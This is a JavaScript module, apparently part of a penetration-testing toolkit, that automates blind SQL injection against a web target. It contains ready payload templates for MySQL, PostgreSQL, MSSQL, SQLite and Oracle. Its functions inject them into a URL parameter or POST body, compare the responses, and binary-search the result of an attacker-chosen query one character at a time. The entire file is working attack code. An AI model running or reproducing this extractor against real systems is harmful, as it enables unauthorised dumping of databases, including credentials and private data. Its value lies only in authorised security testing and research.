const rawhttp = require('./rawhttp');
const encode = require('./encode');
const signatures = require('./signatures');

const TEMPLATES = {
  mysql: {
    template: "' AND (ASCII(SUBSTRING(({{QUERY}}),{{POS}},1))>{{MID}})-- -",
    lengthTemplate: "' AND (LENGTH(({{QUERY}}))>{{MID}})-- -"
  },
  postgres: {
    template: "' AND (ASCII(SUBSTRING(({{QUERY}}),{{POS}},1))>{{MID}})-- -",
    lengthTemplate: "' AND (LENGTH(({{QUERY}}))>{{MID}})-- -"
  },
  mssql: {
    template: "' AND (ASCII(SUBSTRING(({{QUERY}}),{{POS}},1))>{{MID}})--",
    lengthTemplate: "' AND (LEN(({{QUERY}}))>{{MID}})--"
  },
  sqlite: {
    template: "' AND (UNICODE(SUBSTR(({{QUERY}}),{{POS}},1))>{{MID}})--",
    lengthTemplate: "' AND (LENGTH(({{QUERY}}))>{{MID}})--"
  },
  oracle: {
    template: "' AND (SELECT CASE WHEN ASCII(SUBSTR(({{QUERY}}),{{POS}},1))>{{MID}} THEN 1 ELSE 0 END FROM dual)=1--",
    lengthTemplate: "' AND (SELECT CASE WHEN LENGTH(({{QUERY}}))>{{MID}} THEN 1 ELSE 0 END FROM dual)=1--"
  }
};

function replaceAll(template, values) {
  let out = String(template || '');
  for (const key of Object.keys(values)) {
    out = out.split('{{' + key + '}}').join(String(values[key]));
  }
  return out;
}

function buildPayload(template, options) {
  options = options || {};
  return replaceAll(template, {
    QUERY: options.query || '',
    EXPR: options.expr || options.query || '',
    POS: options.pos || 0,
    MID: options.mid === undefined ? 0 : options.mid
  });
}

function buildUrl(options, payload) {
  if (options.param) return encode.setQueryParam(options.url, options.param, payload);
  if (options.data) return options.url;
  const separator = String(options.url).includes('?') ? '&' : '?';
  return options.url + separator + payload;
}

function headersObject(headers) {
  const out = {};
  if (Array.isArray(headers)) {
    for (const header of headers) {
      const idx = String(header).indexOf(':');
      if (idx !== -1) out[String(header).slice(0, idx).trim().toLowerCase()] = String(header).slice(idx + 1).trim();
    }
  } else if (headers && typeof headers === 'object') {
    for (const [name, value] of Object.entries(headers)) out[String(name).toLowerCase()] = String(value);
  }
  return out;
}

async function send(options, payload, request) {
  const url = buildUrl(options, payload);
  const body = options.data ? String(options.data).replace(/FUZZ/g, payload) : undefined;
  const headers = headersObject(options.headers);
  if (options.cookie && !headers.cookie) headers.cookie = String(options.cookie);
  return request({
    url,
    method: options.method || (options.data ? 'POST' : 'GET'),
    headers,
    body,
    timeoutMs: options.timeoutMs || 10000,
    proxy: options.proxy || null,
    maxRedirects: 0,
    rejectUnauthorized: options.rejectUnauthorized !== false,
    http2: Boolean(options.http2)
  });
}

function isTrueResponse(res, options, falseRes) {
  const body = String((res && res.body) || '');
  if (options.trueRegex) {
    const re = options.trueRegex instanceof RegExp ? options.trueRegex : new RegExp(options.trueRegex, 'i');
    return re.test(body);
  }
  if (options.trueText) return body.includes(options.trueText);
  if (!falseRes) return false;
  return signatures.fingerprint(body) !== signatures.fingerprint(falseRes.body || '');
}

async function testCondition(options, template, values, falseRes, request) {
  const payload = buildPayload(template, values);
  const res = await send(options, payload, request);
  return { payload, res, true: isTrueResponse(res, options, falseRes) };
}

async function findLength(options, request) {
  const maxLength = Math.max(1, Number(options.maxLength) || 64);
  const template = options.lengthTemplate || options.template;
  const falsePayload = buildPayload(template, { query: options.query, mid: options.falseMid || 999999, pos: 0 });
  const falseRes = await send(options, falsePayload, request);
  let low = 0;
  let high = maxLength;
  let found = -1;
  let requests = 1;
  while (low <= high) {
    const mid = Math.floor((low + high) / 2);
    const result = await testCondition(options, template, { query: options.query, mid, pos: 0 }, falseRes, request);
    requests++;
    if (result.true) {
      found = mid;
      low = mid + 1;
    } else {
      high = mid - 1;
    }
  }
  return { length: Math.min(maxLength, found + 1), requests };
}

async function extract(options) {
  options = options || {};
  const preset = TEMPLATES[String(options.dbms || '').toLowerCase()];
  const template = options.template || (preset && preset.template);
  const lengthTemplate = options.lengthTemplate || (preset && preset.lengthTemplate);
  if (!options.url || !template) throw new Error('url and template are required');
  options = Object.assign({}, options, { template, lengthTemplate });
  const request = options.request || rawhttp.request;
  let requests = 0;
  let length = Number(options.length) || 0;
  if (!length) {
    const found = await findLength(options, request);
    length = found.length;
    requests += found.requests;
  }
  if (!length) return { value: '', length: 0, requests };
  const minCode = options.minCode === undefined || options.minCode === null ? 32 : Number(options.minCode);
  const maxCode = options.maxCode === undefined || options.maxCode === null ? 126 : Number(options.maxCode);
  let value = '';
  for (let pos = 1; pos <= length; pos++) {
    const falsePayload = buildPayload(options.template, {
      query: options.query,
      mid: options.falseMid || 999999,
      pos
    });
    const falseRes = await send(options, falsePayload, request);
    requests++;
    let low = minCode - 1;
    let high = maxCode;
    let found = minCode - 1;
    while (low <= high) {
      const mid = Math.floor((low + high) / 2);
      const result = await testCondition(options, options.template, { query: options.query, mid, pos }, falseRes, request);
      requests++;
      if (result.true) {
        found = mid;
        low = mid + 1;
      } else {
        high = mid - 1;
      }
    }
    const code = found + 1;
    if (code > maxCode) break;
    value += String.fromCharCode(code);
    if (options.onChar) options.onChar(code, value, pos);
  }
  return { value, length, requests };
}

module.exports = { buildPayload, buildUrl, extract, findLength, templates: TEMPLATES };
